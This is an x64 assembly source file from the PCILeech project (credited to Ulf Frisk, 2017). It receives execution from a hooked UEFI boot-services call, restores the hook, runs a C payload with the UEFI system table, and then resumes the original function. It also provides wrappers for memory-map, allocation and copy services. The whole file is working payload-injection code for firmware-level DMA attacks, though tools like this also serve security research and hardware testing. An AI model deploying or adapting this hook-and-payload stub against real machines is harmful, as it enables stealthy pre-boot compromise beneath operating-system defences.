; uefi_kmd.asm : assembly to receive execution from hooked UEFI
; function call. Compatible with UEFI x64.
;
; - Execution environment is to be x64 in long mode with 1:1 identity mapping
;   between physical/virtual memory. Furthermode only 1 CPU should be running.
; - KMDDATA page is the 4k page _before_ this page.
; - UEFI Calling convention is same as Windows.
;
; (c) Ulf Frisk, 2017
; Author: Ulf Frisk, pcileech@frizk.net
;

EXTRN c_EntryPoint:NEAR

.CODE

main PROC
	; ----------------------------------------------------
	; 0: INITIAL OP AND VARIABLE MEMORY LOCATIONS
	; ----------------------------------------------------
	JMP main_start 
	data_filler					db 00h, 00h		; 2 bytes offset (2 bytes long)
	addr_UEFI_IBI_SYST			dd 00000000h	; 4 bytes offset (4 bytes long)
	addr_HOOK					dd 00000000h	; 8 bytes offset (4 bytes long)
	data_HOOK_ORIG				dd 00000000h	; 12 bytes offset (4 bytes long)
	; ----------------------------------------------------
	; 1: SAVE / PUSH REGISTERS TO STACK
	; ----------------------------------------------------
	main_start:
	PUSH rbx
	PUSH rcx
	PUSH rdx
	PUSH rdi
	PUSH rsi
	PUSH r8
	PUSH r9
	PUSH r10
	PUSH r11
	PUSH r12
	PUSH r13
	PUSH r14
	PUSH r15
	PUSH rbp
	; ----------------------------------------------------
	; 2: RESTORE HOOK TO ORIGINAL STATE
	; ----------------------------------------------------
	MOV eax, [addr_HOOK]
	MOV ecx, [data_HOOK_ORIG]
	MOV [rax], ecx
	; ----------------------------------------------------
	; 3: CALL INTO MAIN PAYLOAD CODE
	; ----------------------------------------------------
	LEA rcx, main
	SUB rcx, 1000h
	MOV edx, [addr_UEFI_IBI_SYST]
	MOV rbp, rsp
	SUB rsp, 20h
	AND rsp, -10h
	CALL c_EntryPoint
	MOV rsp, rbp
	; ----------------------------------------------------
	; 4: RESTORE REGISTERS AND RETURN EXECUTION TO NORMAL.
	; ----------------------------------------------------
	POP rbp
	POP r15
	POP r14
	POP r13
	POP r12
	POP r11
	POP r10
	POP r9
	POP r8
	POP rsi
	POP rdi
	POP rdx
	POP rcx
	POP rbx
	MOV eax, [data_HOOK_ORIG]
	JMP rax
main ENDP

EFI_BOOT_SERVICES_GenericJMP PROC
	MOV eax, [addr_UEFI_IBI_SYST]		; EFI_SYSTEM_TABLE
	ADD rax, 60h						; offset to *BootServices
	MOV rax, [rax]						; EFI_BOOT_SERVICES
	ADD rax, r10						; offset to ????
	MOV rax, [rax]
	JMP rax								; JMP to intended target
EFI_BOOT_SERVICES_GenericJMP ENDP

GetMemoryMap PROC
	MOV r10, 38h
	JMP EFI_BOOT_SERVICES_GenericJMP
GetMemoryMap ENDP

SetMem PROC
	MOV r10, 168h
	JMP EFI_BOOT_SERVICES_GenericJMP
SetMem ENDP

CopyMem PROC
	MOV r10, 160h
	JMP EFI_BOOT_SERVICES_GenericJMP
CopyMem ENDP

SetWatchdogTimer PROC
	MOV r10, 100h
	JMP EFI_BOOT_SERVICES_GenericJMP
SetWatchdogTimer ENDP

AllocatePages PROC
	MOV r10, 28h
	JMP EFI_BOOT_SERVICES_GenericJMP
AllocatePages ENDP

FreePages PROC
	MOV r10, 30h
	JMP EFI_BOOT_SERVICES_GenericJMP
FreePages ENDP

END
